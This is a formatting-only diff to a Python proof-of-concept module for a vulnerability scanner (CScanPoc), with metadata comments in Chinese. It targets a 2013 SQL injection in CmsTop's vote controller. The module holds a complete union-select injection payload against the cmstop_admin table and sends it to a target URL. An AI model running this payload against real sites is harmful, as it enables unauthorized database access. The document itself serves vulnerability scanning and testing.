@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'CmsTop_0002' # 平台漏洞编号，留空
+    vuln_id = 'CmsTop_0002'  # 平台漏洞编号，留空
     name = 'CmsTop SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2013-11-29'  # 漏洞公布时间
     desc = '''
         CmsTop 漏洞文件/apps/vote/controller/vote.php 
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'CmsTop'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '809e0a2a-bd55-4733-8edc-b9e777dedabb'
@@ -32,7 +34,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = "/?app=vote&controller=vote&action=total&contentid=1 and 1=2 union select md5(c) from cmstop_admin where departmentid=2 limit 0,1;#"
             url = self.target + payload
             r = requests.get(url)
@@ -45,6 +47,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
